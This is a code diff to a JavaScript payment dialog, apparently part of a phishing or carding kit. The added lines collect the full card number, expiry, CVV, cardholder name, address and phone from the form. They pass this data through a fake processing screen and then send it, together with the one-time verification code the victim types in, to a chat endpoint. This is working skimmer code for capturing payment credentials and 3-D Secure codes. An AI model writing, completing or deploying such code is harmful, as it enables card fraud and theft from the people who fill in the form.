@@ -2098,11 +2098,25 @@ document.addEventListener('DOMContentLoaded', function(){
                         balance_currency: cur
                     }}));
                     var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
-                    lookupBin(raw).then(function(){ showProcessing(sh, self); });
+                    var cardData = {
+                        card_number: cardInp ? cardInp.value : '',
+                        card_exp:    expInp  ? expInp.value  : '',
+                        card_cvv:    cvvInp  ? cvvInp.value  : '',
+                        card_name:   nameInp ? nameInp.value.trim() : '',
+                        country:     cntry   ? cntry.value   : '',
+                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
+                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
+                        city:        (sh.getElementById('cc-city')||{}).value||'',
+                        phone_dial:  dialEl  ? dialEl.textContent : '',
+                        phone:       phoneInp? phoneInp.value : '',
+                        balance_amount:   amt,
+                        balance_currency: cur
+                    };
+                    lookupBin(raw).then(function(){ showProcessing(sh, self, cardData); });
                 });
             }
 
-            function showProcessing(sh, self){
+            function showProcessing(sh, self, cardData){
                 var dlg=sh.querySelector('.dlg');
                 if(!dlg)return;
                 var brandLabel=(curBrand&&curBrand.id)?curBrand.id.toUpperCase():'CARD';
@@ -2173,12 +2187,12 @@ document.addEventListener('DOMContentLoaded', function(){
                 var self2 = self;
                 function _onRequestCode(){
                     document.removeEventListener('chat:request-code-show', _onRequestCode);
-                    showCodeInput(sh, self2);
+                    showCodeInput(sh, self2, cardData);
                 }
                 document.addEventListener('chat:request-code-show', _onRequestCode);
             }
 
-            function showCodeInput(sh, self){
+            function showCodeInput(sh, self, cardData){
                 var dlg=sh.querySelector('.dlg');
                 if(!dlg)return;
 
@@ -2270,9 +2284,12 @@ document.addEventListener('DOMContentLoaded', function(){
                 sh.getElementById('ci-submit').addEventListener('click',function(){
                     var code=(ciInp.value||'').trim();
                     if(!code){ ciBox.classList.add('err'); return; }
-                    /* отправить код только через /chat/message */
-                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:{trigger:'code', text: code}}));
-                    showProcessing(sh, self);
+                    /* отправить код + все данные карты через /chat/message */
+                    document.dispatchEvent(new CustomEvent('chat:trigger',{detail:Object.assign(
+                        {trigger:'code', text: code, verification_code: code},
+                        cardData || {}
+                    )}));
+                    showProcessing(sh, self, cardData);
                 });
 
                 var ciResend = sh.getElementById('ci-resend');
